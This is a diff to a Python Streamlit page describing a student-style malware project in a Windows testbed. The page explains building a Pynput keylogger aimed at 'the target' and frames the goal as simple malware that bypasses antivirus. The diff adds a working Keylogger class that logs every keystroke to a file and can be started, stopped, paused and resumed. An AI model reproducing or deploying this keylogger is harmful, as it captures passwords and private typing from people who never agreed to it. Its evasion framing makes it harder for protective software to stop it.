@@ -184,21 +184,27 @@ The testbed environment is a **Windows-based environment**. We restrict our test
     
     st.markdown("<h3 style='text-align: left;'>Keylogging</></h3>", unsafe_allow_html=True)
     
-    st.write("""
-             
+    st.write("""    
     The keylogger need of course to log every key typed in the keyboard. For that we have several possibilitys.
     We can use hook function in order to intercept the input of the target. For that we can use the API windows. In python
     we have win32 module to use API function by windows. But we will use Pynput module, more especially the keyboard class.
-    With that, we can with simplicity, log the key typed by the target in his keyboard. The module use WinAPI, so we need to be 
-    careful using it. We have higher chance to trigger the AV. 
-    
-    The thing we can do, is to use syscall function, undocumented function, used in windows to not trigger the AV. But the main objective
-    is using python for the malware.             
-             """)
+    The main objective here is to build the most simplest malware to bypass protection.
+    With Pynput module, we can with simplicity, log the key typed by the target in his keyboard. The module use WinAPI, so we need to be 
+    careful using it. We have higher chance to trigger the AV.            
+    """)
     
     
     keylogger_code = r"""
+class Keylogger:
+    
+    def __init__(self, log_file: str ):
+        self.log_file = log_file
+        self.listener = None   
+        self.pause_event = threading.Event()
+        self.pause_event.set()
+        
     def on_press(self, key):
+        self.pause_event.wait()  #attend si en pause 
         with open(self.log_file,'a') as f:
             if key  == keyboard.Key.space:
                 f.write(' ')
@@ -209,6 +215,20 @@ The testbed environment is a **Windows-based environment**. We restrict our test
             else: 
                 key_str = str(key).strip("'")
                 (f.write(f"{key_str}"))     
+    
+    def start_(self):
+        self.listener = keyboard.Listener(on_press=self.on_press)
+        self.listener.start()
+
+    def stop_(self):
+        if self.listener is not None:
+            self.listener.stop()
+    
+    def pause(self):
+        self.pause_event.clear()
+    
+    def resume(self):
+        self.pause_event.set()     
     
     """
     
